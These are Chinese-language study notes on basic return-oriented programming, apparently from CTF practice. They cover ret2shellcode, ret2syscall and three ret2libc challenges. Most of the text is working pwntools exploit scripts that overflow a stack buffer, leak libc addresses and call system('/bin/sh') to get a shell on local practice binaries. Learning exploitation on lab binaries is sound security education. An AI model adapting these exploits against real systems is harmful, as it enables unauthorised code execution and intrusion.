## 基本rop

---

### 1.防护机制为栈不可栈不可执行，同时函数中有system('/bin/sh')的调用

![image](81989ECD5C2C4B8EABA46D5D41E74113)

![image](BEACC80ADAF145D0A210C6684FC9A89C)

![image](271F5C1773A04B2CBB7F8B8111F6FB8D)
### 2.retshellcode
控制程序执行shellcode代码，要求覆盖区域具有执行的权限。
### 3.ret2syscall
控制系统执行系统调用，开启栈不可执行，且无法利用沉痼的某一段或者自己编写代码来获得shell ， 所以只能利用gadgets来获得shell。（需要再观察下溢出eip的过程）
### 4.ret2libc
控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置。通常情况下执行system("/bin/sh"),故而此时我们需要知道system函数的地址。
#### ret2libc1
![image](20D05A47983E4FD7AC1E5000AE8BED16)
使用gets函数基本ROP漏洞，确定注入地址，在gets函数打断点执行，此时寄存器ebp即注入地址，ebp-esp + 偏移 + 4(对齐32位)刚好辅导搞ebp地址。 
![image](D3CF5D007814467A8AD76811C8848ABE)
查看程序中具有 ‘/bin/bin’ 和 system函数。
**exp**
```
from pwn import *
sh = process('./ret2libc1')
#sh=process('./ret2libc1')
binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['A'*112 , system_plt ,'b' * 4,binsh_addr])
#我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址
sh.sendline(payload);
sh.interactive()
```

#### ret2libc2
1. 两个思路 调用execl 或者使用system
1.1 先实现system调用
这次与ret2lib1 一致， 只是没有/bin/sh 字符串 ， 所以需要我们注入字符串 首先查看32位下  system系统调用规则，


![image](93A76B6CEA1B43A2AB31B24C79A1B275)

将命令字符串地址放入ebx 寄存器，       
![image](AEC8FDC4B2364E73B1931900B0D9A318)

exp：

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080 
# buf 为gets函数的存数据地址
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

#### ret2libc3
 
 参考资料：https://www.anquanke.com/post/id/85831
 
 老规矩检查程序保护
 ![image](ACB3381C4FDD4544BC261540340CE53E)
 放入IDA
 ![image](70BDEAFF7D5E416590CBCF2A578BC29B)
 
 ```
 #!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
#注入puts地址 打印出 main , libc_start_main_got
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])

sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```
 
[这篇博客上给出了手动算出偏移](https://blog.csdn.net/qq_43394612/article/details/85323020)

libc_base=write_addr-libc.symbols["write"]

```
from pwn import*

libc=ELF("libc.so.6")

a=process("./a.out")

plt_write=p32(0x08048320)

vuln_addr=p32(0x08048456)

got_write=p32(0x0804A014)

payload='A'*140+plt_write+vuln_addr+p32(1)+got_write+p32(4)

a.send(payload)

write_addr=u32(a.recv(4))

libc_base=write_addr-libc.symbols["write"]

system_addr=libc_base+libc.symbols["system"]

binbash_addr=libc_base+next(libc.search("/bin/sh"))

payload='A'*140+p32(system_addr)+p32(1)+p32(binbash_addr)

a.send(payload)

a.interactive()

```
